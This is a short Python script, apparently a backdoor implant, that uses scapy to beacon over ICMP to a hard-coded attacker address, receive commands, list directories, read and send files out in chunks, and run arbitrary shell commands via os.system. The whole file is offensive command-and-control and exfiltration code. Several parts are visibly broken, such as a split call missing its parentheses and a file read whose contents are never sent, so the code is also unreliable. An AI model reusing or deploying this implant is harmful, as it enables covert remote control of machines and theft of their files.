from scapy.all import *
import argparse
import os
import time

Att_ip="192.168.1.30"
ICMP_ID_HELO = 23144
ICMP_ID = 13331
is_ready = False
TTL = int(64)
my_iface =  "ens160"
frag_size = 40
""" def DidRec(pkt):
    print("packet recieved")
    global is_ready
    if pkt[ICMP].id == ICMP_ID_HELO:
        is_ready = True
        print("I got a message from my master")
 """

def DidRec(pkt):
    print("blabla")
    print(str(pkt[ICMP]))
    send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/"end")

def ReadAndSend(file_path):
    chunk = frag_size
    with open(file_path) as smgld_file:
        while chunk := smgld_file.read(chunk):
            send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ str(chunk))
            time.sleep(0.5)
        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ "end")
    


def CMDHandler(packet, payload):
    first_word = payload.split()[0]
    if first_word == "ls":
        files = os.scandir(path=payload.split[1])
        for filename in files:
            send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ filename)
        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ "end")

    elif first_word == "get": 
        f = open(payload.split(' ',1)[1])
        content = f.read(frag_size)
        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/ "end")

    elif first_word == "run":
        os.system(payload.split(' ',1)[1])


def main():
    while True:
        send(IP(dst=Att_ip, ttl= TTL)/ICMP(type=8, id=ICMP_ID_HELO )/"waiting")
        packet = sniff(filter="icmp", prn=DidRec, count=1, timeout=1)
        payload = packet[0][IP][Raw].load.decode('utf-8')
        if payload != "":
            CMDHandler(packet, payload)
            
        




if __name__ == "__main__":
    main()






 
